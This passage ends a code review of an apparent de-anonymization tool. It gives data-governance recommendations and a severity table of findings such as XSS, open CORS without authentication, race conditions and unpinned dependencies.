> - The tool's stated purpose (de-anonymizing drug traffickers) means it will inevitably be used with real data.
> 
> **Minimum requirements:**
> 1. Add a `/api/delete-profile/{id}` endpoint with proper authorization.
> 2. Document that any real data use requires legal authorization and data handling procedures.
> 3. Add a `data_source` field to profiles (`"synthetic"` vs `"custom"`) for audit trails.
> 4. Consider encrypting `mock_data.json` at rest if it may contain PII.

---

## Summary — Critical Findings by Severity

| Severity | Count | Key Issues |
|----------|-------|-----------|
| 🔴 **Critical** | 4 | XSS via raw HTML (§7.2), open CORS + no auth (§2.1, §2.3), race conditions on `_state` (§1.1), atomic write data loss (§11.1) |
| 🟠 **High** | 6 | Sync blocking in async (§1.2), unvalidated input (§2.2), thread-unsafe model load (§3.1), emoji false-flag (§3.5), orphaned wallet scores (§6.3), data governance (§11.2) |
| 🟡 **Medium** | 8 | Deprecated startup (§1.3), infinite retry (§1.4), SOL regex FP (§3.3), phone normalization (§4.2), unstable IDs (§4.4), max-norm instability (§6.1), silent errors (§7.3), unpinned deps (§10.3) |
| 🟢 **Low** | 6 | Redundant cosine (§3.2), uncached PyVis (§5.3), node sizing (§5.4), wallet credit (§6.2), iframe height (§7.4), relative paths (§8.3) |
